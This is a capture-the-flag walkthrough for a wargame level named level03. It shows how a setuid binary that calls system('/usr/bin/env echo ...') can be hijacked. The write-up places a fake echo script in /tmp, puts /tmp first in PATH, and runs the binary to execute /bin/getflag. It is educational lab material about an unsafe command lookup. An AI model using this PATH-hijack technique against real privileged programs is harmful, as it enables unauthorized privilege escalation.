# Find the Flag03 Password

When we log in as `level03`, we can see the `level03` executable in the home directory.

If we run it, it prints:

```text
Exploit me
```

To understand what the binary is doing, inspect it with `ltrace`:

```sh
ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>)
getegid()                                                             = 2003
geteuid()                                                             = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                   = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                   = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                = 0
+++ exited (status 0) +++
```

The important line is:

```text
system("/usr/bin/env echo Exploit me")
```

The binary does not call `/bin/echo` directly. Instead, it uses `/usr/bin/env echo`, which searches for `echo` through the `PATH` environment variable.

Because of that, we can place our own executable named `echo` in a directory that appears before the real system directories in `PATH`. When `level03` runs, `/usr/bin/env` will execute our fake `echo` instead.

This is why privileged programs should use absolute paths when executing commands.

## Exploit the PATH Lookup

Create a fake `echo` script in `/tmp`:

```sh
vi /tmp/echo
#!/bin/bash
/bin/getflag
```

Make it executable:

```sh
chmod +x /tmp/echo
```

Then put `/tmp` at the beginning of `PATH`:

```sh
export PATH="/tmp:$PATH"
```

Now run the `level03` executable again:

```sh
./level03
```

The program will execute `/tmp/echo`, which runs `/bin/getflag` and prints the token for `flag03`.
